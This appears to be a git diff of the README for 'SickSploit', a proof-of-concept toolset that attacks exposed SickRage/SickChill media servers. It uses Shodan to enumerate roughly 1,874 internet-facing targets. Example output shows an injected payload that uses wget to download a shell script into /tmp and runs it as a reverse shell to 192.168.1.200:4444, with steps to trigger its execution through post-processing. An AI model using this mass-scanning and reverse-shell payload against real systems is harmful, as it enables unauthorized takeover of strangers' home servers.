@@ -1,7 +1,7 @@
 # SickSploit
 
 Collection of tools/scripts to exploit Sick* instances (SickRage, SickChill and similar forks.)
-
+You can find a more detailed introduction to this collection of tools on [my blog](https://coolbyte.eu/2019/sickown-finding-sickrage-instances/).
 ## Introduction 
 
 SickRage/Chill/Beard are tools to automate the download of TV-Series using torrent or Usenet.
@@ -12,17 +12,25 @@ Sickspolit is a POC tool that exploits a vulnerable instance.
 ## SickOwn 
 
 Sickown uses a simple search query in Shodan to find open instances of Sick* and then attempts to also remove false positives from this list by querying the targets found.
-At the time of the writing, 1834 targets are found.
+At the time of the writing, 1874 targets are found. You can use the -t flag to set the request timeout
+to use (default to 10s).
 
 Example usage of SickOwn is:
 
     $ python sickown.py -h
-    usage: sickown.py [-h] API
+    usage: sickown.py [-h] [-t TIMEOUT] API
+    
     Use Shodan.io to track down vulnerable instances of SickChill/Rage
+    
     positional arguments:
-    API         The API_KEY for Shodan
+      API                   The API_KEY for Shodan
+    
     optional arguments:
-    -h, --help  show this help message and exit
+      -h, --help            show this help message and exit
+      -t TIMEOUT, --timeout TIMEOUT
+                            The timeout to use for the HTTP requests to the
+                            targets found
+
 
 ## SickSploit
 
@@ -71,7 +79,7 @@ Example usage:
         mede8er_data: 0|0|0|0|0|0|0|0|0|0
         file_timestamp_timezone: network
         naming_anime: None
-        tv_download_dir: /home/daniele/process
+        tv_download_dir: /home/user/process
         naming_anime_pattern: Season %0S/%SN - S%0SE%0E - %EN
         kodi_data: 0|0|0|0|0|0|0|0|0|0
         autopostprocessor_frequency: 10
@@ -91,7 +99,7 @@ Example usage:
     [+] Starting to exploit http://192.168.1.105:8081.
     [+] Injecting payload: /usr/bin/wget https://raw.githubusercontent.com/Sudneo/sicksploit/master/shell.py -O /tmp/shell|/usr/bin/python /tmp/shell 192.168.1.200 4444
     [+] Exploit succeeded.
-    [+] Trigger a manual post-processing of /home/daniele/process to execute the injected payload.
+    [+] Trigger a manual post-processing of /home/user/process to execute the injected payload.
     [+] Manual post processing correctly scheduled. It might take a few minutes to actually get executed.
 
 ## Tested on
